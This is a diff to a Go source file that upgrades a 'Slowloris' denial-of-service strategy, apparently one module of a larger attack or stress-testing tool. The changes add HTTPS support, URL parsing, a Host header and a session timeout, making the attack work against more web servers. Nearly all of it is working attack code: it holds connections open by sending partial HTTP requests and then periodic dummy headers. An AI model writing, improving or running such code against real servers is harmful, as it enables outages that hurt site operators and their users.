@@ -2,15 +2,19 @@ package strategy
 
 import (
 	"context"
+	"crypto/tls"
 	"fmt"
 	"math/rand"
 	"net"
+	"net/url"
+	"strings"
 	"time"
 )
 
 type Slowloris struct {
 	keepAliveInterval time.Duration
 	connectionTimeout time.Duration
+	maxSessionLife    time.Duration
 	userAgents        []string
 }
 
@@ -27,40 +31,65 @@ var defaultUserAgents = []string{
 	"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
 }
 
+func init() {
+	rand.Seed(time.Now().UnixNano())
+}
+
 func NewSlowloris(keepAliveInterval time.Duration) *Slowloris {
 	return &Slowloris{
 		keepAliveInterval: keepAliveInterval,
 		connectionTimeout: 10 * time.Second,
+		maxSessionLife:    5 * time.Minute,
 		userAgents:        defaultUserAgents,
 	}
 }
 
 func (s *Slowloris) Execute(ctx context.Context, target Target) error {
-	host := extractHost(target.URL)
-	if host == "" {
-		return fmt.Errorf("invalid target URL: %s", target.URL)
+	parsedURL, host, useTLS, err := parseTargetURL(target.URL)
+	if err != nil {
+		return err
 	}
 
+	sessionCtx, cancel := context.WithTimeout(ctx, s.maxSessionLife)
+	defer cancel()
+
+	var conn net.Conn
 	dialer := &net.Dialer{
 		Timeout: s.connectionTimeout,
 	}
 
-	conn, err := dialer.DialContext(ctx, "tcp", host)
+	if useTLS {
+		tlsConfig := &tls.Config{
+			ServerName:         parsedURL.Hostname(),
+			InsecureSkipVerify: false,
+		}
+		conn, err = tls.DialWithDialer(dialer, "tcp", host, tlsConfig)
+	} else {
+		conn, err = dialer.DialContext(sessionCtx, "tcp", host)
+	}
+
 	if err != nil {
 		return fmt.Errorf("connection failed: %w", err)
 	}
 	defer conn.Close()
 
 	userAgent := s.userAgents[rand.Intn(len(s.userAgents))]
-	
+	path := parsedURL.Path
+	if path == "" {
+		path = "/"
+	}
+
 	initialHeaders := []string{
-		"GET / HTTP/1.1\r\n",
+		fmt.Sprintf("GET %s HTTP/1.1\r\n", path),
+		fmt.Sprintf("Host: %s\r\n", parsedURL.Host),
 		fmt.Sprintf("User-Agent: %s\r\n", userAgent),
 		"Accept-language: en-US,en;q=0.9\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
+		"Connection: keep-alive\r\n",
 	}
 
 	for _, header := range initialHeaders {
+		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
 		if _, err := conn.Write([]byte(header)); err != nil {
 			return fmt.Errorf("failed to write initial header: %w", err)
 		}
@@ -71,10 +100,10 @@ func (s *Slowloris) Execute(ctx context.Context, target Target) error {
 
 	for {
 		select {
-		case <-ctx.Done():
+		case <-sessionCtx.Done():
 			return nil
 		case <-ticker.C:
-			dummyHeader := fmt.Sprintf("X-Random-%d: %d\r\n",
+			dummyHeader := fmt.Sprintf("X-Keep-Alive-%d: %d\r\n",
 				rand.Intn(100000),
 				time.Now().UnixNano())
 
@@ -90,48 +119,31 @@ func (s *Slowloris) Name() string {
 	return "slowloris"
 }
 
-func extractHost(url string) string {
-	if len(url) < 7 {
-		return ""
+func parseTargetURL(targetURL string) (*url.URL, string, bool, error) {
+	parsed, err := url.Parse(targetURL)
+	if err != nil {
+		return nil, "", false, fmt.Errorf("invalid URL: %w", err)
 	}
 
-	start := 0
-	if url[:7] == "http://" {
-		start = 7
-	} else if len(url) >= 8 && url[:8] == "https://" {
-		start = 8
+	scheme := strings.ToLower(parsed.Scheme)
+	if scheme != "http" && scheme != "https" {
+		return nil, "", false, fmt.Errorf("unsupported scheme: %s (only http/https allowed)", scheme)
 	}
 
-	end := len(url)
-	for i := start; i < len(url); i++ {
-		if url[i] == '/' || url[i] == '?' {
-			end = i
-			break
+	host := parsed.Host
+	if host == "" {
+		return nil, "", false, fmt.Errorf("missing host in URL")
+	}
+
+	useTLS := scheme == "https"
+
+	if !strings.Contains(host, ":") {
+		if useTLS {
+			host += ":443"
+		} else {
+			host += ":80"
 		}
 	}
 
-	host := url[start:end]
-
-	if len(host) > 0 && host[len(host)-1] != ':' {
-		hasPort := false
-		for i := len(host) - 1; i >= 0; i-- {
-			if host[i] == ':' {
-				hasPort = true
-				break
-			}
-			if host[i] == '.' {
-				break
-			}
-		}
-
-		if !hasPort {
-			if url[:7] == "http://" {
-				host += ":80"
-			} else {
-				host += ":443"
-			}
-		}
-	}
-
-	return host
+	return parsed, host, useTLS, nil
 }
